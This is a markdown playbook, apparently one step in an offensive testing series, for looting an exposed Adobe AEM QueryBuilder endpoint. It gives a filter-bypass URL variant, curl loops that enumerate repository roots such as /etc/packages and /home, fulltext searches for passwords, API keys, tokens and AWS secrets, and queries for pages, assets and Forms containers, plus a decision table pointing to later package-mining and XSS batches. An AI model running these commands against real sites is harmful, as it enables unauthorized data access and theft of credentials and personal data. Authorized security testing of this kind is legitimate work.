# Batch 07 — Loot with a working QueryBuilder URL

## objective

With a working `QB` URL (direct or bypass), run a **small set** of high-value searches: content tree, packages path, users, password-ish fulltext. Stop when you have leads for batch 08.

## estimated_time

60–120 minutes

## prerequisites

- Working QueryBuilder (from 03–06)
- Example:

```bash
T="https://TARGET"
QB="$T/bin/querybuilder.json"
# or: QB="$T/bin/querybuilder.json;x='a/b.css/c'"
```

## testing_workflow

### 1) Technique A — map important roots

```bash
for path in /content /content/dam /etc /etc/packages /home /conf /apps /var; do
  echo "===== $path ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=$path" \
    --data-urlencode "p.limit=10" \
    -o /tmp/q.json -w "code=%{http_code} size=%{size_download}\n"
  head -c 220 /tmp/q.json; echo
done
```

### 2) Technique B — fulltext for secrets (keep list short)

```bash
for term in password secret credential api_key token jdbc aws confidential; do
  echo "===== fulltext=$term ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=/content" \
    --data-urlencode "fulltext=$term" \
    --data-urlencode "p.limit=8" \
    -o /tmp/q.json -w "code=%{http_code} size=%{size_download}\n"
  head -c 250 /tmp/q.json; echo
done
```

### 3) Technique C — type filters (pages / assets)

```bash
curl -sk -G "$QB" \
  --data-urlencode "type=cq:Page" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=15" -o pages.json

curl -sk -G "$QB" \
  --data-urlencode "type=dam:Asset" \
  --data-urlencode "path=/content/dam" \
  --data-urlencode "p.limit=15" -o assets.json

# guide containers (for Forms later)
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=10" -o guides.json
```

### 4) Session notes template

```text
QB=...
Open roots: ...
Secret hits: ...
Package path present: yes/no
Guide containers: yes/no
```

## decision_points

| If… | Then… |
|-----|--------|
| `/etc/packages` lists zips | Next session **08** first |
| Only `/content` open | Still **08** (content mining) |
| Empty hits everywhere | ACL tight; try **09–11** XSS/gadgets; keep QB for authenticated tests later |
| guideContainer found | After 08, jump **12–13** |

## expected_findings

- Path enumeration, PII/docs leads, package paths, user nodes, Forms nodes

## next_batch_to_continue_with

→ **[08-packages-content-secrets.md](./08-packages-content-secrets.md)**
